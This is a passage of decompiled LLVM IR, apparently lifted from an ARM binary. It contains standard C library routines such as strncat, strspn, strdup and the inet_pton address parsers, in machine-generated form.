  br i1 %v9_19150, label %dec_label_pc_19158, label %dec_label_pc_19160

dec_label_pc_19158:                               ; preds = %bb18
  ret i32 %v1_19140

dec_label_pc_19160:                               ; preds = %bb18
  %v2_19160 = inttoptr i32 %v1_19144 to i8*
  %v3_19160 = load i8, i8* %v2_19160, align 1
  %v4_19160 = zext i8 %v3_19160 to i32
  %v9_19164 = icmp eq i32 %v4_19160, %v1_190dc
  store i1 %v9_19164, i1* @cpsr_z, align 1
  br i1 %v9_19164, label %dec_label_pc_1916c, label %dec_label_pc_19174

dec_label_pc_1916c:                               ; preds = %dec_label_pc_19160
  ret i32 %v1_19144

dec_label_pc_19174:                               ; preds = %dec_label_pc_19160
  %v2_19174 = inttoptr i32 %v1_1913c to i8*
  %v3_19174 = load i8, i8* %v2_19174, align 1
  %v4_19174 = zext i8 %v3_19174 to i32
  %v9_19178 = icmp eq i32 %v4_19174, %v1_190dc
  store i1 %v9_19178, i1* @cpsr_z, align 1
  br i1 %v9_19178, label %dec_label_pc_19180, label %dec_label_pc_19108

dec_label_pc_19180:                               ; preds = %dec_label_pc_19174
  ret i32 %v1_1913c

; uselistorder directives
  uselistorder i32 %v4_19108, { 2, 1, 0 }
  uselistorder i32 %v0_19108, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_190fc, { 1, 0 }
  uselistorder i32 %v1_190dc, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 -2130640640, { 6, 7, 2, 0, 8, 3, 1, 4, 5 }
  uselistorder i32 2130640639, { 4, 0, 1, 2, 3 }
}

define i32 @__GI_strncat(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_19190 = load i32, i32* @r4, align 4
  store i32 %v3_19190, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1919c

dec_label_pc_1919c:                               ; preds = %dec_label_pc_1919c, %entry
  %v0_1919c = phi i32 [ %v5_1919c, %dec_label_pc_1919c ], [ %tmp, %entry ]
  %v1_1919c = inttoptr i32 %v0_1919c to i8*
  %v2_1919c = load i8, i8* %v1_1919c, align 1
  %v3_1919c = zext i8 %v2_1919c to i32
  store i32 %v3_1919c, i32* %ip.global-to-local, align 4
  %v5_1919c = add i32 %v0_1919c, 1
  store i32 %v5_1919c, i32* %r3.global-to-local, align 4
  %v2_191a0 = icmp eq i8 %v2_1919c, 0
  store i1 %v2_191a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_191a0, label %dec_label_pc_191a8, label %dec_label_pc_1919c

dec_label_pc_191a8:                               ; preds = %dec_label_pc_1919c
  %v0_191a8 = load i32, i32* %r2.global-to-local, align 4
  %v7_191a8 = icmp eq i32 %v0_191a8, 3
  store i1 %v7_191a8, i1* %cpsr_z.global-to-local, align 1
  %v1_191ac = add i32 %v0_1919c, -1
  store i32 %v1_191ac, i32* %lr.global-to-local, align 4
  %tmp10 = icmp ult i32 %v0_191a8, 4
  br i1 %tmp10, label %dec_label_pc_19240thread-pre-split, label %dec_label_pc_191b4

dec_label_pc_191b4:                               ; preds = %dec_label_pc_191a8
  %v3_191b4 = udiv i32 %v0_191a8, 4
  store i32 %v3_191b4, i32* %r0.global-to-local, align 4
  %v0_191b8.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_191b8

dec_label_pc_191b8:                               ; preds = %dec_label_pc_19218, %dec_label_pc_191b4
  %v2_191c0 = phi i32 [ %v1_19210, %dec_label_pc_19218 ], [ %v1_191ac, %dec_label_pc_191b4 ]
  %v0_191b8 = phi i32 [ %v1_1920c, %dec_label_pc_19218 ], [ %v0_191b8.pre, %dec_label_pc_191b4 ]
  %v1_191b8 = inttoptr i32 %v0_191b8 to i8*
  %v2_191b8 = load i8, i8* %v1_191b8, align 1
  %v3_191b8 = zext i8 %v2_191b8 to i32
  store i32 %v3_191b8, i32* %r3.global-to-local, align 4
  %v2_191bc = icmp eq i8 %v2_191b8, 0
  store i1 %v2_191bc, i1* %cpsr_z.global-to-local, align 1
  %v3_191c0 = add i32 %v2_191c0, 1
  %v4_191c0 = inttoptr i32 %v3_191c0 to i8*
  store i8 %v2_191b8, i8* %v4_191c0, align 1
  %v0_191c4 = load i32, i32* %lr.global-to-local, align 4
  %v1_191c4 = add i32 %v0_191c4, 1
  store i32 %v1_191c4, i32* %ip.global-to-local, align 4
  %v0_191c8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_191c8, label %.loopexit, label %dec_label_pc_191cc

dec_label_pc_191cc:                               ; preds = %dec_label_pc_191b8
  %v0_191cc = load i32, i32* @r1, align 4
  %v1_191cc = add i32 %v0_191cc, 1
  %v2_191cc = inttoptr i32 %v1_191cc to i8*
  %v3_191cc = load i8, i8* %v2_191cc, align 1
  %v4_191cc = zext i8 %v3_191cc to i32
  store i32 %v4_191cc, i32* %r3.global-to-local, align 4
  %v2_191d0 = icmp eq i8 %v3_191cc, 0
  store i1 %v2_191d0, i1* %cpsr_z.global-to-local, align 1
  %v3_191d4 = add i32 %v0_191c4, 2
  %v4_191d4 = inttoptr i32 %v3_191d4 to i8*
  store i8 %v3_191cc, i8* %v4_191d4, align 1
  %v0_191d8 = load i32, i32* @r1, align 4
  %v1_191d8 = add i32 %v0_191d8, 1
  store i32 %v1_191d8, i32* %r1.global-to-local, align 4
  %v0_191dc = load i32, i32* %ip.global-to-local, align 4
  %v1_191dc = add i32 %v0_191dc, 1
  store i32 %v1_191dc, i32* %ip.global-to-local, align 4
  %v0_191e0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_191e0, label %.loopexit, label %dec_label_pc_191e4

dec_label_pc_191e4:                               ; preds = %dec_label_pc_191cc
  %v1_191e4 = add i32 %v0_191d8, 2
  %v2_191e4 = inttoptr i32 %v1_191e4 to i8*
  %v3_191e4 = load i8, i8* %v2_191e4, align 1
  %v4_191e4 = zext i8 %v3_191e4 to i32
  store i32 %v4_191e4, i32* %r3.global-to-local, align 4
  %v2_191e8 = icmp eq i8 %v3_191e4, 0
  store i1 %v2_191e8, i1* %cpsr_z.global-to-local, align 1
  %v3_191ec = add i32 %v0_191dc, 2
  %v4_191ec = inttoptr i32 %v3_191ec to i8*
  store i8 %v3_191e4, i8* %v4_191ec, align 1
  %v0_191f0 = load i32, i32* %r1.global-to-local, align 4
  %v1_191f0 = add i32 %v0_191f0, 1
  store i32 %v1_191f0, i32* %r1.global-to-local, align 4
  %v0_191f4 = load i32, i32* %ip.global-to-local, align 4
  %v1_191f4 = add i32 %v0_191f4, 1
  store i32 %v1_191f4, i32* %lr.global-to-local, align 4
  %v0_191f8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_191f8, label %.loopexit, label %dec_label_pc_191fc

dec_label_pc_191fc:                               ; preds = %dec_label_pc_191e4
  %v1_191fc = add i32 %v0_191f0, 2
  %v2_191fc = inttoptr i32 %v1_191fc to i8*
  %v3_191fc = load i8, i8* %v2_191fc, align 1
  %v4_191fc = zext i8 %v3_191fc to i32
  store i32 %v4_191fc, i32* %ip.global-to-local, align 4
  store i32 %v1_191fc, i32* %r3.global-to-local, align 4
  %v2_19204 = icmp eq i8 %v3_191fc, 0
  store i1 %v2_19204, i1* %cpsr_z.global-to-local, align 1
  %v3_19208 = add i32 %v0_191f4, 2
  %v4_19208 = inttoptr i32 %v3_19208 to i8*
  store i8 %v3_191fc, i8* %v4_19208, align 1
  %v0_1920c = load i32, i32* %r3.global-to-local, align 4
  %v1_1920c = add i32 %v0_1920c, 1
  store i32 %v1_1920c, i32* @r1, align 4
  %v0_19210 = load i32, i32* %lr.global-to-local, align 4
  %v1_19210 = add i32 %v0_19210, 1
  store i32 %v1_19210, i32* %lr.global-to-local, align 4
  %v0_19214 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19214, label %.loopexit, label %dec_label_pc_19218

dec_label_pc_19218:                               ; preds = %dec_label_pc_191fc
  %v0_19218 = load i32, i32* %r0.global-to-local, align 4
  %v1_19218 = add i32 %v0_19218, -1
  store i32 %v1_19218, i32* %r0.global-to-local, align 4
  %v7_19218 = icmp eq i32 %v0_19218, 1
  store i1 %v7_19218, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19218, label %dec_label_pc_19220, label %dec_label_pc_191b8

dec_label_pc_19220:                               ; preds = %dec_label_pc_19218
  %v0_19220 = load i32, i32* %r2.global-to-local, align 4
  %v1_19220 = urem i32 %v0_19220, 4
  store i32 %v1_19220, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19240

dec_label_pc_19228:                               ; preds = %dec_label_pc_19240
  %v0_19228 = load i32, i32* @r1, align 4
  %v1_19228 = inttoptr i32 %v0_19228 to i8*
  %v2_19228 = load i8, i8* %v1_19228, align 1
  %v3_19228 = zext i8 %v2_19228 to i32
  store i32 %v3_19228, i32* %ip.global-to-local, align 4
  %v2_1922c = icmp eq i8 %v2_19228, 0
  store i1 %v2_1922c, i1* %cpsr_z.global-to-local, align 1
  %v1_19230 = add i32 %v1_1924c, -1
  store i32 %v1_19230, i32* %r2.global-to-local, align 4
  %v3_19234 = add i32 %v3_1924c, 1
  %v4_19234 = inttoptr i32 %v3_19234 to i8*
  store i8 %v2_19228, i8* %v4_19234, align 1
  %v5_19234 = load i32, i32* %lr.global-to-local, align 4
  %v6_19234 = add i32 %v5_19234, 1
  store i32 %v6_19234, i32* %lr.global-to-local, align 4
  %v0_19238 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19238, label %.loopexit, label %dec_label_pc_1923c

dec_label_pc_1923c:                               ; preds = %dec_label_pc_19228
  %v0_1923c = load i32, i32* @r1, align 4
  %v1_1923c = add i32 %v0_1923c, 1
  store i32 %v1_1923c, i32* @r1, align 4
  %v0_19240.pr.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19240thread-pre-split

dec_label_pc_19240thread-pre-split:               ; preds = %dec_label_pc_1923c, %dec_label_pc_191a8
  %v2_192346 = phi i32 [ %v6_19234, %dec_label_pc_1923c ], [ %v1_191ac, %dec_label_pc_191a8 ]
  %v0_19240.pr = phi i32 [ %v0_19240.pr.pre, %dec_label_pc_1923c ], [ %v0_191a8, %dec_label_pc_191a8 ]
  br label %dec_label_pc_19240

dec_label_pc_19240:                               ; preds = %dec_label_pc_19240thread-pre-split, %dec_label_pc_19220
  %v3_1924c = phi i32 [ %v2_192346, %dec_label_pc_19240thread-pre-split ], [ %v1_19210, %dec_label_pc_19220 ]
  %v1_1924c = phi i32 [ %v0_19240.pr, %dec_label_pc_19240thread-pre-split ], [ %v1_19220, %dec_label_pc_19220 ]
  %v2_19240 = icmp eq i32 %v1_1924c, 0
  store i1 %v2_19240, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19240, label %dec_label_pc_19248, label %dec_label_pc_19228

dec_label_pc_19248:                               ; preds = %dec_label_pc_19240
  %v0_19248 = load i32, i32* %ip.global-to-local, align 4
  %v2_19248 = icmp eq i32 %v0_19248, 0
  store i1 %v2_19248, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19248, label %.loopexit, label %bb

bb:                                               ; preds = %dec_label_pc_19248
  %v4_1924c = add i32 %v3_1924c, 1
  %v5_1924c = inttoptr i32 %v4_1924c to i8*
  store i8 0, i8* %v5_1924c, align 1
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_191fc, %dec_label_pc_191e4, %dec_label_pc_191cc, %dec_label_pc_191b8, %dec_label_pc_19228, %dec_label_pc_19248, %bb
  %v0_19250 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_19250, i32* %r0.global-to-local, align 4
  %v2_19254 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_19254, i32* @r4, align 4
  ret i32 %v0_19250

; uselistorder directives
  uselistorder i32 %v1_1924c, { 1, 0 }
  uselistorder i32 %v1_19220, { 1, 0 }
  uselistorder i32 %v0_19218, { 1, 0 }
  uselistorder i32 %v1_19210, { 0, 2, 1 }
  uselistorder i32 %v1_1920c, { 1, 0 }
  uselistorder i32 %v0_191a8, { 2, 1, 0, 3 }
  uselistorder i32 %v5_1919c, { 1, 0 }
  uselistorder i32 %v0_1919c, { 0, 2, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32* %r2.global-to-local, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %lr.global-to-local, { 0, 4, 1, 2, 3, 5, 6 }
  uselistorder i32* %ip.global-to-local, { 6, 0, 1, 2, 3, 4, 5, 7 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder label %.loopexit, { 6, 5, 4, 0, 1, 2, 3 }
}

define i32 @__GI_strspn(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 0, i32* @lr, align 4
  %v0_192902 = load i32, i32* @r0, align 4
  %v1_192903 = inttoptr i32 %v0_192902 to i8*
  %v2_192904 = load i8, i8* %v1_192903, align 1
  %v3_192905 = zext i8 %v2_192904 to i32
  store i32 %v3_192905, i32* @r2, align 4
  %v2_192946 = icmp eq i8 %v2_192904, 0
  br i1 %v2_192946, label %dec_label_pc_192a0, label %dec_label_pc_1926c.preheader

dec_label_pc_19264:                               ; preds = %dec_label_pc_1926c
  %v1_19274 = add i32 %v0_19274, 1
  %v9_19264 = icmp eq i32 %v0_19280, %v3_1926c
  br i1 %v9_19264, label %dec_label_pc_19280, label %dec_label_pc_1926c

dec_label_pc_1926c:                               ; preds = %dec_label_pc_1926c.preheader, %dec_label_pc_19264
  %v0_19274 = phi i32 [ %tmp, %dec_label_pc_1926c.preheader ], [ %v1_19274, %dec_label_pc_19264 ]
  %v1_1926c = inttoptr i32 %v0_19274 to i8*
  %v2_1926c = load i8, i8* %v1_1926c, align 1
  %v3_1926c = zext i8 %v2_1926c to i32
  store i32 %v3_1926c, i32* @ip, align 4
  %v2_19270 = icmp eq i8 %v2_1926c, 0
  br i1 %v2_19270, label %dec_label_pc_192a0, label %dec_label_pc_19264

dec_label_pc_19280:                               ; preds = %dec_label_pc_19264
  %v2_19280 = icmp eq i32 %v0_19280, 0
  br i1 %v2_19280, label %dec_label_pc_192a0, label %dec_label_pc_19288

dec_label_pc_19288:                               ; preds = %dec_label_pc_19280
  %v1_19288 = add i32 %v0_19288, 1
  store i32 %v1_19288, i32* @lr, align 4
  %v1_1928c = add i32 %v0_1928c, 1
  %v1_19290 = inttoptr i32 %v1_1928c to i8*
  %v2_19290 = load i8, i8* %v1_19290, align 1
  %v3_19290 = zext i8 %v2_19290 to i32
  store i32 %v3_19290, i32* @r2, align 4
  %v2_19294 = icmp eq i8 %v2_19290, 0
  br i1 %v2_19294, label %dec_label_pc_192a0, label %dec_label_pc_1926c.preheader

dec_label_pc_1926c.preheader:                     ; preds = %entry, %dec_label_pc_19288
  %v0_1928c = phi i32 [ %v1_1928c, %dec_label_pc_19288 ], [ %v0_192902, %entry ]
  %v0_19288 = phi i32 [ %v1_19288, %dec_label_pc_19288 ], [ 0, %entry ]
  %v0_19280 = phi i32 [ %v3_19290, %dec_label_pc_19288 ], [ %v3_192905, %entry ]
  br label %dec_label_pc_1926c

dec_label_pc_192a0:                               ; preds = %dec_label_pc_19280, %dec_label_pc_19288, %dec_label_pc_1926c, %entry
  %v0_192a0 = phi i32 [ 0, %entry ], [ %v0_19288, %dec_label_pc_1926c ], [ %v1_19288, %dec_label_pc_19288 ], [ %v0_19288, %dec_label_pc_19280 ]
  ret i32 %v0_192a0

; uselistorder directives
  uselistorder i32 %v3_1926c, { 1, 0 }
  uselistorder i32 %v0_19274, { 1, 0 }
  uselistorder label %dec_label_pc_192a0, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1926c.preheader, { 1, 0 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %v3_192a8 = load i32, i32* @r4, align 4
  store i32 %v3_192a8, i32* %stack_var_-12, align 4
  %v6_192a8 = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r5, align 4
  %v3_192b0 = call i32 @strlen(i8* %arg1)
  %v1_192b4 = add i32 %v3_192b0, 1
  store i32 %v1_192b4, i32* @r4, align 4
  %v1_192bc = call i32 @malloc(i32 %v1_192b4)
  store i32 103120, i32* @lr, align 4
  %v1_192cc = icmp ne i32 %v1_192bc, 0
  call void @__pseudo_cond_branch(i1 %v1_192cc, i32 ptrtoint (i32* @global_var_13d40.1228 to i32))
  %v2_192d4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_192d4, i32* @r4, align 4
  store i32 %v6_192a8, i32* @r5, align 4
  ret i32 %v1_192bc

; uselistorder directives
  uselistorder i32 (i32)* @malloc, { 4, 3, 2, 1, 0, 11, 10, 9, 8, 7, 6, 5 }
}

define i32 @inet_pton4(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v6_192d8 = load i32, i32* @r5, align 4
  %v2_192e0 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg2, i32* @r5, align 4
  store i32 0, i32* @lr, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v2_192e0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-16, align 4
  %v2_193683 = load i8, i8* %arg1, align 1
  %v3_193684 = zext i8 %v2_193683 to i32
  %v5_193685 = add i32 %tmp, 1
  store i32 %v5_193685, i32* @r4, align 4
  %v2_1936c6 = icmp eq i8 %v2_193683, 0
  store i1 %v2_1936c6, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1936c6, label %dec_label_pc_19378, label %dec_label_pc_19300

dec_label_pc_19300:                               ; preds = %entry, %dec_label_pc_19368.backedge
  %v0_19344 = phi i32 [ %v3_19368, %dec_label_pc_19368.backedge ], [ %v3_193684, %entry ]
  %v1_1937010.in = phi i32 [ %v3_19368, %dec_label_pc_19368.backedge ], [ %v3_193684, %entry ]
  %v1_1937010 = add nsw i32 %v1_1937010.in, -48
  %v2_19300 = icmp ugt i32 %v1_1937010, 8
  %v7_19300 = icmp eq i32 %v1_1937010, 9
  store i1 %v7_19300, i1* %cpsr_z.global-to-local, align 1
  %v2_19308 = xor i1 %v7_19300, true
  %v3_19308 = and i1 %v2_19300, %v2_19308
  br i1 %v3_19308, label %dec_label_pc_19344, label %dec_label_pc_1930c

dec_label_pc_1930c:                               ; preds = %dec_label_pc_19300
  %v0_1930c = load i32, i32* %r0.global-to-local, align 4
  %v1_1930c = inttoptr i32 %v0_1930c to i8*
  %v2_1930c = load i8, i8* %v1_1930c, align 1
  %v3_1930c = zext i8 %v2_1930c to i32
  %v3_19314 = mul nuw nsw i32 %v3_1930c, 10
  %v4_19314 = add nuw nsw i32 %v3_19314, %v0_19344
  %v1_19318 = add nsw i32 %v4_19314, -48
  %v2_1931c = icmp ugt i32 %v1_19318, 254
  %v7_1931c = icmp eq i32 %v1_19318, 255
  store i1 %v7_1931c, i1* %cpsr_z.global-to-local, align 1
  %v2_19320 = xor i1 %v7_1931c, true
  %v3_19320 = and i1 %v2_1931c, %v2_19320
  br i1 %v3_19320, label %dec_label_pc_1939c, label %dec_label_pc_19324

dec_label_pc_19324:                               ; preds = %dec_label_pc_1930c
  %v0_19324 = load i32, i32* %r1.global-to-local, align 4
  %v2_19324 = icmp eq i32 %v0_19324, 0
  store i1 %v2_19324, i1* %cpsr_z.global-to-local, align 1
  %v1_19328 = trunc i32 %v1_19318 to i8
  store i8 %v1_19328, i8* %v1_1930c, align 1
  %v0_1932c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1932c, label %dec_label_pc_19330, label %dec_label_pc_19368.backedge

dec_label_pc_19330:                               ; preds = %dec_label_pc_19324
  %v0_19330 = load i32, i32* @lr, align 4
  %v1_19330 = add i32 %v0_19330, 1
  store i32 %v1_19330, i32* @lr, align 4
  %v7_19334 = icmp eq i32 %v1_19330, 4
  store i1 %v7_19334, i1* %cpsr_z.global-to-local, align 1
  %v0_19338 = load i32, i32* %r1.global-to-local, align 4
  %v1_19338 = add i32 %v0_19338, 1
  store i32 %v1_19338, i32* %r1.global-to-local, align 4
  %v8_1933c = icmp sgt i32 %v1_19330, 4
  br i1 %v8_1933c, label %dec_label_pc_1939c, label %dec_label_pc_19368.backedge

dec_label_pc_19344:                               ; preds = %dec_label_pc_19300
  %v7_19344 = icmp eq i32 %v0_19344, 46
  store i1 %v7_19344, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19344, label %bb, label %.thread12

.thread12:                                        ; preds = %dec_label_pc_19344
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1939c

bb:                                               ; preds = %dec_label_pc_19344
  %v1_1934c = load i32, i32* %r1.global-to-local, align 4
  %v2_1934c = urem i32 %v1_1934c, 2
  %v2_19350 = icmp eq i32 %v2_1934c, 0
  store i1 %v2_19350, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  br i1 %v2_19350, label %dec_label_pc_1939c, label %dec_label_pc_1935c

dec_label_pc_1935c:                               ; preds = %bb
  %v0_1935c = load i32, i32* @lr, align 4
  %v7_1935c = icmp eq i32 %v0_1935c, 4
  store i1 %v7_1935c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1935c, label %dec_label_pc_1939c, label %dec_label_pc_19364

dec_label_pc_19364:                               ; preds = %dec_label_pc_1935c
  %v2_19364 = load i32, i32* %r0.global-to-local, align 4
  %v3_19364 = add i32 %v2_19364, 1
  %v4_19364 = inttoptr i32 %v3_19364 to i8*
  store i8 0, i8* %v4_19364, align 1
  %v5_19364 = load i32, i32* %r0.global-to-local, align 4
  %v6_19364 = add i32 %v5_19364, 1
  store i32 %v6_19364, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19368.backedge

dec_label_pc_19368.backedge:                      ; preds = %dec_label_pc_19364, %dec_label_pc_19324, %dec_label_pc_19330
  %v0_19368 = load i32, i32* @r4, align 4
  %v1_19368 = inttoptr i32 %v0_19368 to i8*
  %v2_19368 = load i8, i8* %v1_19368, align 1
  %v3_19368 = zext i8 %v2_19368 to i32
  %v5_19368 = add i32 %v0_19368, 1
  store i32 %v5_19368, i32* @r4, align 4
  %v2_1936c = icmp eq i8 %v2_19368, 0
  store i1 %v2_1936c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1936c, label %dec_label_pc_19368.dec_label_pc_19378_crit_edge, label %dec_label_pc_19300

dec_label_pc_19368.dec_label_pc_19378_crit_edge:  ; preds = %dec_label_pc_19368.backedge
  %v0_19378.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_19378

dec_label_pc_19378:                               ; preds = %dec_label_pc_19368.dec_label_pc_19378_crit_edge, %entry
  %v0_19378 = phi i32 [ %v0_19378.pre, %dec_label_pc_19368.dec_label_pc_19378_crit_edge ], [ 0, %entry ]
  %v7_19378 = icmp eq i32 %v0_19378, 3
  store i1 %v7_19378, i1* %cpsr_z.global-to-local, align 1
  %v7_1937c = icmp slt i32 %v0_19378, 4
  br i1 %v7_1937c, label %dec_label_pc_1939c, label %dec_label_pc_19380

dec_label_pc_19380:                               ; preds = %dec_label_pc_19378
  %v0_19380 = load i32, i32* @r5, align 4
  store i32 %v0_19380, i32* @r0, align 4
  store i32 %v2_192e0, i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  %v0_1938c = call i32 @memcpy()
  br label %dec_label_pc_1939c

dec_label_pc_1939c:                               ; preds = %dec_label_pc_1930c, %dec_label_pc_19330, %bb, %dec_label_pc_1935c, %.thread12, %dec_label_pc_19378, %dec_label_pc_19380
  %storemerge = phi i32 [ 1, %dec_label_pc_19380 ], [ 0, %dec_label_pc_19378 ], [ 0, %.thread12 ], [ 0, %dec_label_pc_1935c ], [ 0, %bb ], [ 0, %dec_label_pc_19330 ], [ 0, %dec_label_pc_1930c ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v6_192d8, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_19378, { 1, 0 }
  uselistorder i32 %v3_19368, { 1, 0 }
  uselistorder i32 %v0_19344, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 4, 1, 3, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 2, 11, 3, 4, 0, 5, 6, 7, 8, 9, 10, 1 }
  uselistorder label %dec_label_pc_1939c, { 6, 5, 3, 2, 4, 1, 0 }
  uselistorder label %dec_label_pc_19368.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_19300, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v3_193a4 = load i32, i32* @r4, align 4
  %v6_193a4 = load i32, i32* @r5, align 4
  %v9_193a4 = load i32, i32* @r6, align 4
  %v7_193a8 = icmp eq i32 %arg1, 2
  store i32 %tmp, i32* @r6, align 4
  store i32 %arg3, i32* %stack_var_-60, align 4
  br i1 %v7_193a8, label %dec_label_pc_193c8, label %dec_label_pc_193bc

dec_label_pc_193bc:                               ; preds = %entry
  %v7_193bc = icmp eq i32 %arg1, 10
  br i1 %v7_193bc, label %dec_label_pc_193dc, label %dec_label_pc_1958c

dec_label_pc_193c8:                               ; preds = %entry
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v4_193d0 = call i32 @inet_pton4(i8* %arg2, i32 %arg3)
  store i32 %v4_193d0, i32* %r0.global-to-local, align 4
  store i32 %v4_193d0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_195a4

dec_label_pc_193dc:                               ; preds = %dec_label_pc_193bc
  %v2_193dc = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_193dc, i32* %r0.global-to-local, align 4
  store i32 16, i32* @r2, align 4
  %v2_193e8 = bitcast i32* %stack_var_-52 to i8*
  %v3_193e8 = call i32 @__GI_memset(i8* %v2_193e8, i32 0)
  store i32 %v3_193e8, i32* %r0.global-to-local, align 4
  %v0_193ec = load i32, i32* @r6, align 4
  %v1_193ec = inttoptr i32 %v0_193ec to i8*
  %v2_193ec = load i8, i8* %v1_193ec, align 1
  %v3_193ec = zext i8 %v2_193ec to i32
  store i32 %v3_193ec, i32* %r3.global-to-local, align 4
  %v7_193f0 = icmp eq i8 %v2_193ec, 58
  store i32 %v3_193e8, i32* @r4, align 4
  %v2_193f8 = add i32 %v3_193e8, 16
  store i32 %v2_193f8, i32* %r8.global-to-local, align 4
  br i1 %v7_193f0, label %dec_label_pc_19400, label %dec_label_pc_1940c

dec_label_pc_19400:                               ; preds = %dec_label_pc_193dc
  %v1_19400 = add i32 %v0_193ec, 1
  %v2_19400 = inttoptr i32 %v1_19400 to i8*
  %v3_19400 = load i8, i8* %v2_19400, align 1
  %v4_19400 = zext i8 %v3_19400 to i32
  store i32 %v4_19400, i32* %r3.global-to-local, align 4
  store i32 %v1_19400, i32* @r6, align 4
  %v7_19404 = icmp eq i8 %v3_19400, 58
  br i1 %v7_19404, label %dec_label_pc_1940c, label %dec_label_pc_195a0

dec_label_pc_1940c:                               ; preds = %dec_label_pc_19400, %dec_label_pc_193dc
  %v0_19410 = phi i32 [ %v1_19400, %dec_label_pc_19400 ], [ %v0_193ec, %dec_label_pc_193dc ]
  store i32 0, i32* %fp.global-to-local, align 4
  store i32 %v0_19410, i32* %sl.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v1_194ec7 = inttoptr i32 %v0_19410 to i8*
  %v2_194ec8 = load i8, i8* %v1_194ec7, align 1
  %v3_194ec9 = zext i8 %v2_194ec8 to i32
  store i32 %v3_194ec9, i32* %r0.global-to-local, align 4
  %v1_194f010 = call i32 @__GI_tolower(i32 %v3_194ec9)
  store i32 %v1_194f010, i32* %r0.global-to-local, align 4
  store i32 %v1_194f010, i32* @r5, align 4
